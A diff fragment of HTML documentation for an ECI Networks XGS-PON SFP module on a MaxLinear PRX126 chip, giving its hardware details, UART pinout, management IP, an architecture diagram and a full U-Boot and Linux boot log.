+<td style="text-align: right;"><strong><abbr title="Bidirectional Optical Sub-Assemblies">BOSA</abbr></strong></td>
+<td><abbr title="Subscriber Connector">SC</abbr>/<abbr title="Angled Physical Contact">APC</abbr> - Tx: 1270 nm / Rx: 1577 nm</td>
+<td><a href="https://www.macom.com/products/product-detail/M02180" rel="noopener" target="_blank">M02180</a></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr></strong></td>
+<td><img alt="✔" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2714.svg" title=":check_mark:" /></td>
+<td><a href="https://www.macom.com/products/product-detail/M02180" rel="noopener" target="_blank">M02180</a></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Universal Asynchronous Receiver/Transmitter">UART</abbr></strong></td>
+<td>Rx: pin 7 / Tx: pin 2 - 115200-8-1-N</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Internet Protocol">IP</abbr></strong></td>
+<td><a href="https://192.168.11.1/" rel="noopener" target="_blank">192.168.11.1</a></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Hypertext Transfer Protocol">HTTP</abbr>(S)</strong></td>
+<td><img alt="✔" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2714.svg" title=":check_mark:" /></td>
+<td><a href="#web-credentials">Web Credentials</a></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Secure SHell">SSH</abbr></strong></td>
+<td><img alt="✔" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2714.svg" title=":check_mark:" /> <em>Disabled by default (BFW/Azores firmware)</em></td>
+<td><a href="#shell-credentials">Shell Credentials</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="architecture">Architecture<a class="headerlink" href="#architecture" title="Permanent link">&para;</a></h2>
+<h3 id="maxlinear-prx126">MaxLinear PRX126 <sup id="fnref:2"><a class="footnote-ref" href="#fn:2">2</a></sup><a class="headerlink" href="#maxlinear-prx126" title="Permanent link">&para;</a></h3>
+<pre class="mermaid"><code>%%{ init: { 'flowchart': { 'htmlLabels': false, 'curve': 'stepBefore' } } }%%
+flowchart LR
+    Z[" "] &lt;--Fiber --&gt;
+    A(BOSA)
+    B("DRIVER/
+    LA
+    (PMD)")
+    A --&gt; B
+    B --&gt; A
+    subgraph SOC
+        C("SERDES
+        /CDR")
+        subgraph MAC
+            D("10G(E)PON
+            PCS&amp;MAC/
+            TC") ~~~
+            E("10G-
+            Ethernet
+            PCS&amp;MAC")
+        end
+        C &lt;--&gt; MAC
+        F("Network
+        Processsor
+        /Package
+        Switch")
+        MAC &lt;--&gt; F
+        G("10G-
+        Ethernet
+        PCS&amp;
+        MAC")
+        F &lt;--&gt; G &lt;--&gt;
+        H("SERDES
+        /CDR")
+        I("XO/PLL") ~~~
+        J("Multi-Core Processor/Subsystem Controller")
+    end
+    B &lt;--&gt; C
+    Y[" "]
+    Y -- SFI/XFI --&gt; H
+    H --&gt; Y
+    J &lt;-- I2C --&gt; X[" "]
+    SOC ~~~
+    K("Crystal 40Mhz") ~~~
+    L("SLC NAND Flash") ~~~
+    M("LPDDR3")
+    style SOC fill:transparent,stroke:limegreen,stroke-width:2px,color:#fff,stroke-dasharray: 10 5
+    style MAC fill:PapayaWhip,stroke:SandyBrown,color:transparent,stroke-width:2px
+    classDef SEA fill:LightSkyBlue,font-weight:bold,stroke:DodgerBlue,stroke-width:2px
+    classDef CORAL fill:PapayaWhip,font-weight:bold,stroke:SandyBrown,stroke-width:2px
+    classDef CLEAR fill:transparent,stroke:transparent,color:transparent
+    class A,C,F,G,I,J,K,H,L,M SEA
+    class B,D,E,G CORAL
+    class Z,Y,X CLEAR</code></pre>
+<h2 id="system-information">System Information<a class="headerlink" href="#system-information" title="Permanent link">&para;</a></h2>
+<h3 id="boot-log">Boot log<a class="headerlink" href="#boot-log" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>ROM VER: 2.1.0
+CFG 0d
+B
+DdrOk 
+
+
+U-Boot 2016.07-MXL-v-3.1.261 (Apr 19 2023 - 07:07:22 +0000), Build: prx126-sfp-qspi-nand
+
+interAptiv
+cps cpu/ddr run in 400/466 Mhz
+       Watchdog enabled
+DRAM:  256 MiB
+NAND:  device found, Manufacturer ID: 0xef, Chip ID: 0xba
+128 MiB
+Bad block table found at page 65472, version 0x01
+Bad block table found at page 65408, version 0x01
+In:    serial
+Out:   serial
+Err:   serial
+Reset cause: POR RESET
+Net:   lan-0 config to 1G_XAUI_MODE, lan-1 config to 10G_KR_MODE, prx300-eth
+
+run flash_flash to bring up the kernel
+
+Hit Esc key to stop autoboot:  3 
+begin net init
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+ 2 
+begin net init
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+ 1 
+begin net init
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+upgrade start! 
+pt_upg_auto_upgrade start!
+Timeout or packet isn&#39;t legal. Do not enter multicast upgrade
+auto upgrade failed.
+ 0 
+ubi0: attaching mtd1
+ubi0: scanning is finished
+ubi0: attached mtd1 (name &quot;mtd=6&quot;, size 102 MiB)
+ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
+ubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0
+ubi0: user volume: 8, internal volumes: 1, max. volumes count: 128
+ubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0
+ubi0: available PEBs: 175, total reserved PEBs: 641, PEBs reserved for bad PEB handling: 20
+Remove UBI volume rootfs_data (id 6)
+Committed image: A
+ubi0: detaching mtd1
+ubi0: mtd1 is detached
+ubi0: attaching mtd1
+ubi0: scanning is finished
+ubi0: attached mtd1 (name &quot;mtd=6&quot;, size 102 MiB)
+ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
+ubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0
+ubi0: user volume: 7, internal volumes: 1, max. volumes count: 128
+ubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0
+ubi0: available PEBs: 440, total reserved PEBs: 376, PEBs reserved for bad PEB handling: 20
+Read 0 bytes from volume bootcoreA to a0400000
+No size specified -&gt; Using max size (5586944)
+Read 0 bytes from volume kernelA to 82000000
+No size specified -&gt; Using max size (2412544)
+## Booting kernel from Legacy Image at 82000000 ...
+   Image Name:   PON_1.18.0
+   Created:      2023-04-19   7:11:20 UTC
+   Image Type:   MIPS Linux Kernel Image (lzma compressed)
+   Data Size:    2285568 Bytes = 2.2 MiB
+   Load Address: a0020000
+   Entry Point:  a0020000
+   Verifying Checksum ... OK
+   Uncompressing Kernel Image ... OK
+[    0.000000] Linux version 4.9.308+ (gcc version 8.3.0 (OpenWrt GCC 8.3.0 v19.07.8_maxlinear) ) #0 SMP Wed Apr 19 06:54:47 UTC 2023
+[    0.000000] SoC: PRX300 rev 1.2
+[    0.000000] CPU0 revision is: 0001a120 (MIPS interAptiv (multi))
+[    0.000000] Enhanced Virtual Addressing (EVA 1GB) activated
+[    0.000000] MIPS: machine is PRX126-SFP-PON
+[    0.000000] Coherence Manager IOCU detected
+[    0.000000] Hardware DMA cache coherency disabled
+[    0.000000] earlycon: lantiq0 at MMIO 0x16380000 (options &#39;&#39;)
+[    0.000000] bootconsole [lantiq0] enabled
+[    0.000000] User-defined physical RAM map:
+[    0.000000]  memory: 40000000 @ 20000000 (usable)
+[    0.000000] Reserved memory: created CMA memory pool at 0x2d000000, size 48 MiB
+[    0.000000] OF: reserved mem: initialized node linux,cma@0x2D000000, compatible id shared-dma-pool
+[    0.000000] Reserved memory: created CMA memory pool at 0x40000000, size 512 MiB
+[    0.000000] OF: reserved mem: initialized node bm_pool@40000000, compatible id shared-dma-pool
+[    0.000000] Determined physical RAM map:
+[    0.000000]  memory: 40000000 @ 20000000 (usable)
+[    0.000000]  memory: 0000809e @ 20768630 (reserved)
+[    0.000000]  memory: 22000000 @ 3e000000 (reserved)
+[    0.000000]  memory: 03000000 @ 2d000000 (reserved)
+[    0.000000]  memory: 00200000 @ 3be00000 (reserved)
+[    0.000000] Initrd not found or empty - disabling initrd
+[    0.000000] SMPCMP: CPU0: cmp_smp_setup
+[    0.000000] VPE topology {2,2} total 4
+[    0.000000] Detected 3 available secondary CPU(s)
+[    0.000000] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.
+[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.000000] Zone ranges:
+[    0.000000]   DMA      [mem 0x0000000020000000-0x000000002fffffff]
+[    0.000000]   Normal   [mem 0x0000000030000000-0x000000005fffffff]
+[    0.000000] Movable zone start for each node
+[    0.000000] Early memory node ranges
+[    0.000000]   node   0: [mem 0x0000000020000000-0x000000005fffffff]
+[    0.000000] Initmem setup node 0 [mem 0x0000000020000000-0x000000005fffffff]
+[    0.000000] percpu: Embedded 12 pages/cpu s17968 r8192 d22992 u49152
+[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 260096
+[    0.000000] Kernel command line: ubi.mtd=system_sw,2048 rootfsname=rootfsA rootfstype=squashfs ip=192.168.1.1:192.168.1.2:192.162.1.1:255.2 
+[    0.000000] PID hash table entries: 4096 (order: 2, 16384 bytes)
+[    0.000000] Dentry cache hash table entries: 131072 (order: 7, 524288 bytes)
+[    0.000000] Inode-cache hash table entries: 65536 (order: 6, 262144 bytes)
+[    0.000000] Writing ErrCtl register=00000000
+[    0.000000] Readback ErrCtl register=00000000
+[    0.000000] Memory: 421880K/1048576K available (5529K kernel code, 289K rwdata, 1392K rodata, 1284K init, 468K bss, 53256K reserved, 573440)
+[    0.000000] SLUB: HWalign=32, Order=0-3, MinObjects=0, CPUs=4, Nodes=1
+[    0.000000] Hierarchical RCU implementation.
+[    0.000000] NR_IRQS:527
+[    0.000000] EIC is off
+[    0.000000] VINT is on
+[    0.000000] CPU Clock: 400000000Hz  mips_hpt_frequency 200000000Hz
+[    0.000000] clocksource: GIC: mask: 0xffffffffffffffff max_cycles: 0x5c4093a7d1, max_idle_ns: 440795210635 ns
+[    0.000017] sched_clock: 64 bits at 400MHz, resolution 2ns, wraps every 4398046511103ns
+[    0.008523] Calibrating delay loop... 265.98 BogoMIPS (lpj=531968)
+[    0.045333] pid_max: default: 32768 minimum: 301
+[    0.050380] Mount-cache hash table entries: 2048 (order: 1, 8192 bytes)
+[    0.056568] Mountpoint-cache hash table entries: 2048 (order: 1, 8192 bytes)
+[    0.065364] CCA is coherent, multi-core is fine
+[    0.079899] Per DT Bootup LINUX not run on CPU 1
+[    0.083172] Please retry with MAX_CPUS !!!
+[    0.087141] cpu 1 is not available for Linux
+[    1.114295] CPU1: failed to start
+[    1.117026] Per DT Bootup LINUX not run on CPU 2
+[    1.120784] Please retry with MAX_CPUS !!!
+[    1.124838] cpu 2 is not available for Linux
+[    2.143926] CPU2: failed to start
+[    2.146647] Per DT Bootup LINUX not run on CPU 3
+[    2.150418] Please retry with MAX_CPUS !!!
+[    2.154465] cpu 3 is not available for Linux
+[    3.173557] CPU3: failed to start
+[    3.175435] Brought up 1 CPUs
+[    3.198011] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
+[    3.206435] futex hash table entries: 1024 (order: 3, 32768 bytes)
+[    3.267677] pinctrl core: initialized pinctrl subsystem
+[    3.273965] NET: Registered protocol family 16
+[    3.283227] intel-pinctrl 16310000.pinctrl: pinbank id: 0, reg: 0xb6310000, pinbase: 0, pin number: 32, pinmap: 0xffffffff
+[    3.293420] intel-pinctrl 16310000.pinctrl: Total 27 groups, 17 functions
+[    3.299926] intel-pinctrl 16310000.pinctrl: gpiochip membase: 0xb6300000
+[    3.325317] Lantiq MIPSInterAptiv MPS driver, version 1.0.0.0, (c) 2006-2013 Lantiq Deutschland GmbH
+[    3.333931] MPS: major Id 253
+[    3.339302] dma0-grx500 16e00000.dma: base address b6e00000 chained_irq 34 irq_base 57
+[    3.345894] dma0-grx500 16e00000.dma: Init done - hw rev: A, ports: 4, channels: 16
+[    3.354075] dma-grx500 18200000.dma: dma1tx base address b8200000 chained_irq 38 irq_base 73
+[    3.377645] dma-grx500 18200000.dma: Init done - rev: 30, ports: 1, channels: 17
+[    3.384234] dma-grx500 18300000.dma: dma1rx base address b8300000 chained_irq 39 irq_base 90
+[    3.396981] dma-grx500 18300000.dma: Init done - rev: 30, ports: 1, channels: 8
+[    3.403195] dma-grx500 18500000.dma: dma2tx base address b8500000 chained_irq 40 irq_base 98
+[    3.415618] dma-grx500 18500000.dma: Init done - rev: 30, ports: 1, channels: 2
+[    3.421778] dma-grx500 18600000.dma: dma2rx base address b8600000 chained_irq 41 irq_base 100
+[    3.434637] dma-grx500 18600000.dma: Init done - rev: 30, ports: 1, channels: 8
+[    3.444133] [PP_DEV]:init_clocks:184: enabling pp clock &#39;ppv4&#39;
+[    3.448630] [PP_DEV]:init_clocks:184: enabling pp clock &#39;freq&#39;
+[    3.457406] [PP_QOS_UTILS]:qos_init_wred_ports:4603: Init QoS 128 ports
+[    3.462607] [PP_QOS_UTILS]:qos_init_wred_queues:4614: Init QoS 256 queues
+[    3.501480] pstore: using zlib compression
+[    3.506138] console [pstore-1] enabled
+[    3.508753] pstore: Registered ramoops as persistent store backend
+[    3.514627] ramoops: attached 0x200000@0x3be00000, ecc: 0/0
+[    3.548363] prx300-cqm prx300-cqm.1: assigned reserved memory node bm_pool@40000000
+[    3.642026] 0x80000000 0x1120000 0x400
+[    3.644417] 0x80000000 0x1120000
+[    3.725890] 0x81120000 0xfa0000 0x2800
+[    3.728199] 0x81120000 0xfa0000
+[    4.961580] 0x820c0000 0xf7f0000 0x400
+[    4.963982] 0x820c0000 0xf7f0000
+[    6.101993] 0x918b0000 0xe4c0000 0x2800
+[    6.104396] 0x918b0000 0xe4c0000
+[    6.128233] prx300-cqm prx300-cqm.1: fsqm init successfully, free buffers 7167
+[    6.134426] Load spreader init successfully
+[    6.138592] prx300-cqm prx300-cqm.1: CBM: Init Done !!
+[    6.143696] pps_core: LinuxPPS API ver. 1 registered
+[    6.148288] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti &lt;giometti@linux.it&gt;
+[    6.157430] PTP clock support registered
+[    6.165355] clocksource: Switched to clocksource GIC
+[    6.172066] NET: Registered protocol family 2
+[    6.175394] IP idents hash table entries: 16384 (order: 5, 131072 bytes)
+[    6.184552] TCP established hash table entries: 8192 (order: 3, 32768 bytes)
+[    6.190555] TCP bind hash table entries: 8192 (order: 4, 65536 bytes)
+[    6.196929] TCP: Hash tables configured (established 8192 bind 8192)
+[    6.203183] UDP hash table entries: 512 (order: 2, 16384 bytes)
+[    6.208952] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)
+[    6.215613] NET: Registered protocol family 1
+[    6.227072] No memory allocated for crashlog
+[    6.232651] workingset: timestamp_bits=30 max_order=18 bucket_order=0
+[    6.250022] squashfs: version 4.0 (2009/01/31) Phillip Lougher
+[    6.254483] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.
+[    6.289596] io scheduler noop registered
+[    6.292084] io scheduler deadline registered (default)
+[    6.298887] platform 1a800000.cb0phy: PHY(0:1) clock frequency set to 156250000 Success!
+[    6.309116] 16380000.serial: ttyLTQ0 at MMIO 0x16380000 (irq = 25, base_baud = 0) is a lantiq,asc
+[    6.326154] console [ttyLTQ0] enabled
+[    6.326154] console [ttyLTQ0] enabled
+[    6.332032] bootconsole [lantiq0] disabled
+[    6.332032] bootconsole [lantiq0] disabled
+[    6.340793] 163c0000.serial: ttyLTQ1 at MMIO 0x163c0000 (irq = 28, base_baud = 0) is a lantiq,asc
+[    6.353955] brd: module loaded
+[    6.356600] Gluebi: Found kernel commandline option &#39;rootfsname=rootfsA&#39;
+[    6.365997] Lantiq SoC SPI controller rev 9 (TXFS 32, RXFS 32, DMA 1)
+[    6.372013] cadence-qspi 19300000.qspi: missing lantiq,qspi-physize; default to 128 MB
+[    6.378978] cadence-qspi 19300000.qspi: DMA NOT enabled
+[    6.386083] cadence-qspi 19300000.qspi: master is unqueued, this is deprecated
+[    6.395063] nand: device found, Manufacturer ID: 0xef, Chip ID: 0xba
+[    6.400047] nand: Winbond SPI NAND 1Gbit 1,8v WN25N01GW
+[    6.405217] nand: 128 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64
+[    6.414026] Bad block table found at page 65472, version 0x01
+[    6.419503] Bad block table found at page 65408, version 0x01
+[    6.425448] 9 cmdlinepart partitions found on MTD device nand.0
+[    6.430128] Creating 9 MTD partitions on &quot;nand.0&quot;:
+[    6.434900] 0x000000000000-0x000000100000 : &quot;uboot&quot;
+[    6.442014] 0x000000100000-0x000000140000 : &quot;ubootconfigA&quot;
+[    6.448731] 0x000000140000-0x000000180000 : &quot;ubootconfigB&quot;
+[    6.455512] 0x000000180000-0x0000001c0000 : &quot;gphyfirmware&quot;
+[    6.462817] 0x0000001c0000-0x0000002c0000 : &quot;calibration&quot;
+[    6.469697] 0x0000002c0000-0x0000012c0000 : &quot;bootcore&quot;
+[    6.476154] 0x0000012c0000-0x0000078c0000 : &quot;system_sw&quot;
+[    6.483995] 0x0000078c0000-0x000007ec0000 : &quot;ptdata&quot;
+[    6.490705] 0x000007ec0000-0x000008000000 : &quot;res&quot;
+[    6.496748] cadence-qspi 19300000.qspi: Cadence QSPI controller driver
+[    6.502196] MACsec IEEE 802.1AE
+[    6.506680] intel_xpcs 1a842000.lan_xpcs1: XPCS probe start
+[    6.552438] intel_xpcs 1a842000.lan_xpcs1: XPCS probe success
+[    6.575438] dp manager dummy init done
+[    6.579014] ltq_thermal 16000000.ssx4:ts: ltq_thermal_probe: is done
+[    6.584686] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[445] cpu_clk=400000000
+[    6.591714] grx500wdt 12000000.watchdog: [grx500wdt_probe]WDT reset is Bit31, RCU_IAP_WDT_RST_STAT=0x8030408
+[    6.601481] grx500wdt 12000000.watchdog: [grx500wdt_probe]Not WDT reset.
+[    6.608184] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[554] grx500_wdt = 70824178
+[    6.616428] grx500wdt 12000000.watchdog: H/w Watchdog Timer: (max 10) (nowayout= 0)
+[    6.624857] cpu cpu0: dev_pm_opp_of_get_sharing_cpus: Couldn&#39;t find opp node.
+[    6.633024] init netlink module
+[    6.636436] NET: Registered protocol family 10
+[    6.647006] NET: Registered protocol family 17
+[    6.650312] 8021q: 802.1Q VLAN Support v1.8
+[    6.665953] ubi0: attaching mtd6
+[    8.255143] ubi0: scanning is finished
+[    8.287306] ubi0: attached mtd6 (name &quot;system_sw&quot;, size 102 MiB)
+[    8.292018] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+[    8.298769] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+[    8.305534] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096
+[    8.312477] ubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0
+[    8.318468] ubi0: user volume: 7, internal volumes: 1, max. volumes count: 128
+[    8.325674] ubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0
+[    8.334007] ubi0: available PEBs: 440, total reserved PEBs: 376, PEBs reserved for bad PEB handling: 20
+[    8.344110] ubi0: background thread &quot;ubi_bgt0d&quot; started, PID 455
+[    8.356495] Gluebi: mtd &#39;rootfsA&#39; set to be root filesystem
+[    8.360834] rootdev: 0x01f0000b, mtd block: 0000001f, mtd index: 0000000b
+[    8.402103] VFS: Mounted root (squashfs filesystem) readonly on device 31:11.
+[    8.414008] Freeing unused kernel: 1284k freed
+[    8.417014] This architecture does not have kernel memory protection.
+[    9.242044] init: Console is alive
+[    9.244397] init: - watchdog -
+[   10.744331] kmodloader: loading kernel modules from /etc/modules-boot.d/*
+[   10.807669] kmodloader: done loading kernel modules from /etc/modules-boot.d/*
+[   10.817637] init: - preinit -
+[   12.249891] random: procd: uninitialized urandom read (4 bytes read)
+Volume ID 6, size 265 LEBs (33648640 bytes, 32.0 MiB), LEB size 126976 bytes (124.0 KiB), dynamic, name &quot;rootfs_data&quot;, alignment 1
+[   12.720492] random: jshn: uninitialized urandom read (4 bytes read)
+[   12.915650] random: jshn: uninitialized urandom read (4 bytes read)
+ls: /lib/modules/4.9.308+/ltq_atm*: No such file or directory
+Press the [f] key and hit [enter] to enter failsafe mode
+Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level
+[   16.535357] UBIFS (ubi0:6): default file-system created
+[   16.545419] UBIFS (ubi0:6): background thread &quot;ubifs_bgt0_6&quot; started, PID 575
+[   16.735500] UBIFS (ubi0:6): UBIFS: mounted UBI device 0, volume 6, name &quot;rootfs_data&quot;
+[   16.741994] UBIFS (ubi0:6): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
+[   16.751823] UBIFS (ubi0:6): FS size: 32378880 bytes (30 MiB, 255 LEBs), journal size 1650688 bytes (1 MiB, 13 LEBs)
+[   16.762233] UBIFS (ubi0:6): reserved for root: 1529334 bytes (1493 KiB)
+[   16.768838] UBIFS (ubi0:6): media format: w4/r0 (latest is w4/r0), UUID FFCF3C93-8005-4374-BE0E-C7B04DC15AA2, small LPT model
+[   16.790641] mount_root: overlay filesystem has not been fully initialized yet
+[   16.797390] mount_root: switching to ubifs overlay
+[   16.842201] urandom-seed: Seed file not found (/etc/urandom.seed)
+&gt;&gt;&gt;&gt;&gt; Mounting /ptconf partition &lt;&lt;&lt;&lt;&lt;
+UBI=0
+[   17.192079] UBIFS (ubi0:7): background thread &quot;ubifs_bgt0_7&quot; started, PID 585
+[   17.316381] UBIFS (ubi0:7): recovery needed
+[   17.585241] UBIFS (ubi0:7): recovery completed
+[   17.588416] UBIFS (ubi0:7): UBIFS: mounted UBI device 0, volume 7, name &quot;ptconf&quot;
+[   17.595676] UBIFS (ubi0:7): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
+[   17.605556] UBIFS (ubi0:7): FS size: 4825088 bytes (4 MiB, 38 LEBs), journal size 1015809 bytes (0 MiB, 6 LEBs)
+[   17.615618] UBIFS (ubi0:7): reserved for root: 227900 bytes (222 KiB)
+[   17.622051] UBIFS (ubi0:7): media format: w4/r0 (latest is w4/r0), UUID 90134634-9CC8-426E-A46D-346D602B08AD, small LPT model
+&gt;&gt;&gt;&gt;&gt; Mounting /ptdata partition &lt;&lt;&lt;&lt;&lt;
+MTD=7
+[   17.808266] ubi2: attaching mtd7
+[   17.905339] ubi2: scanning is finished
+[   17.933583] ubi2: attached mtd7 (name &quot;ptdata&quot;, size 6 MiB)
+[   17.937819] ubi2: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+[   17.944612] ubi2: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+[   17.951382] ubi2: VID header offset: 2048 (aligned 2048), data offset: 4096
+[   17.958323] ubi2: good PEBs: 48, bad PEBs: 0, corrupted PEBs: 0
+[   17.964225] ubi2: user volume: 1, internal volumes: 1, max. volumes count: 128
+[   17.971436] ubi2: max/mean erase counter: 3/1, WL threshold: 4096, image sequence number: 191176628
+[   17.980460] ubi2: available PEBs: 0, total reserved PEBs: 48, PEBs reserved for bad PEB handling: 20
+[   17.991553] ubi2: background thread &quot;ubi_bgt2d&quot; started, PID 592
+&gt;&gt;&gt;&gt;&gt; Mounting ptdata partition as UBIFS &lt;&lt;&lt;&lt;&lt;
+UBI=2
+PTDATA_NAME=ptdata
+[   18.119620] UBIFS (ubi2:0): background thread &quot;ubifs_bgt2_0&quot; started, PID 610
+[   18.408431] UBIFS (ubi2:0): UBIFS: mounted UBI device 2, volume 0, name &quot;ptdata&quot;
+[   18.414494] UBIFS (ubi2:0): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
+[   18.424322] UBIFS (ubi2:0): FS size: 1904640 bytes (1 MiB, 15 LEBs), journal size 888833 bytes (0 MiB, 5 LEBs)
+[   18.434299] UBIFS (ubi2:0): reserved for root: 89960 bytes (87 KiB)
+[   18.440556] UBIFS (ubi2:0): media format: w4/r0 (latest is w4/r0), UUID 0D6691F3-65A7-4542-8792-9AE400DEAF37, small LPT model
+/ptconf is not empty
+[   18.607879] procd: - early -
+[   18.609723] procd: - watchdog -
+[   19.459362] procd: - watchdog -
+[   19.461703] procd: - ubus -
+[   19.560403] urandom_read: 3 callbacks suppressed
+[   19.560419] random: ubusd: uninitialized urandom read (4 bytes read)
+[   19.570568] random: ubusd: uninitialized urandom read (4 bytes read)
+[   19.576437] random: ubusd: uninitialized urandom read (4 bytes read)
+[   19.584304] procd: - init -
+Please press Enter to activate this console.
+[   20.343068] kmodloader: loading kernel modules from /etc/modules.d/*
+[   20.391981] [PP_NAD]:__net_adapter_init:58: start: 1
+[   20.482075] [PP_QOS_FW]:do_load_firmware:318: FW [v 1.16.0] is running soc rev 1)
+[   20.488889] [PP_DEV]:pp_dev_late_init:676: PP is ready!
+[   20.556867] dp_pre_init done
+[   20.705296] mod_sfp_i2c-ACA_FW: ACA FW Hdr V2: version=0x0018, SOC=0x1 (soc_step_B), Chip=0x2 (chip_falcon), Built=0x0 (built_rel), FW=0x1 )
+[   20.717186] pon-sfp-i2c 14050000.sfp_i2c: FW interface version 0x04000000
+[   20.898603] ip6_tables: (C) 2000-2006 Netfilter Core Team
+[   20.922792] i2c /dev entries driver
+[   20.932533] i2c-gpio i2c-gpio: using pins 507 (SDA) and 506 (SCL)
+[   20.943009] GACT probability on
+[   20.947390] Mirror/redirect action on
+[   20.969751] u32 classifier
+[   20.971028]     input device check on
+[   20.974715]     Actions configured
+[   21.031795] Ebtables v2.0 registered
+[   21.038915] ip_tables: (C) 2000-2006 Netfilter Core Team
+[   21.105620] nf_conntrack version 0.5.0 (16384 buckets, 65536 max)
+[   21.315105] xt_time: kernel timezone is -0000
+[   21.401703] Property intel,extra-subif for if eth0_0 4
+[   21.424489] xrx500_of_iface: rx csum offload is enabled !
+[   21.452301] Lantiq ethernet driver for XRX500 init.
+[   21.617820] kmodloader: done loading kernel modules from /etc/modules.d/*
+MIPS: set unaligned_action to &#39;SHOW&#39;
+factory_mode:0
+sync A0 table success
+sync A2 table success
+Start status monitoring for I2C EEPROM[0]@0x50 EEPROM[1]@0x51
+[optic-db] Looking for &#39;/etc/optic-db/ecinetworks-enxgsfppomacv2-V1.0-prx126-sfp-pon&#39; configuration
+[optic-db] Looking for &#39;/etc/optic-db/ecinetworks-enxgsfppomacv2-prx126-sfp-pon&#39; configuration
+[optic-db] Looking for &#39;/etc/optic-db/ecinetworks-enxgsfppomacv2-V1.0&#39; configuration
+[optic-db] Looking for &#39;/etc/optic-db/ecinetworks-enxgsfppomacv2&#39; configuration
+[optic-db] Looking for &#39;/etc/optic-db/default&#39; configuration
+[optic-db] Applied &#39;/etc/optic-db/default&#39; configuration
+[serdes-db] Looking for &#39;/etc/serdes-db/prx126-sfp-pon-ecinetworks-enxgsfppomacv2-V1.0.conf&#39; configuration
+[serdes-db] Looking for &#39;/etc/serdes-db/prx126-sfp-pon-ecinetworks-enxgsfppomacv2.conf&#39; configuration
+[serdes-db] Looking for &#39;/etc/serdes-db/prx126-sfp-pon.conf&#39; configuration
+[serdes-db] Applied &#39;/etc/serdes-db/prx126-sfp-pon.conf&#39; configuration
+[   37.256222] UBIFS (ubi2:0): background thread &quot;ubifs_bgt2_0&quot; stops
+[   37.393727] gpio_probe enter: 45
+[   37.395578] gpio_probe enter: 52 out gpio_num=2
+[   37.400186] gpio_probe enter: 68 gpiod_direction_output [0]
+[   37.405669] gpio_probe enter: 68 gpiod_direction_output [1]
+[   37.411190] gpio_probe enter: 76 in gpio_num=-2
+[   37.415990] ptdrv gpio adp  init
+[   37.419097] ptdrv gpio init
+[   37.439325] in pon_dev_init
+[   37.440799] out pon_dev_init
+[   37.457982] pt_gpon_drv: no symbol version for log_print
+[   37.462808] [PON]&lt;Info&gt;, line[464], pon_krl_port_fun_register_init:pon_krl_port_fun_register_init
+[   37.470826] [PON]&lt;Error&gt;, line[83], pon_driver_init:s_pon_user_init:0,s_pon_tx_power_on:0
+[   37.470826] 
+set_bootcmd_env:48 pt_env_fw_read 
+set_bootcmd_env:50 buf=run ubi_init;ubi remove rootfs_data;run flash_flash 
+set_bootcmd_env:51 buf, strlen=51 
+set_bootcmd_env:54 buf,last char=0x68 
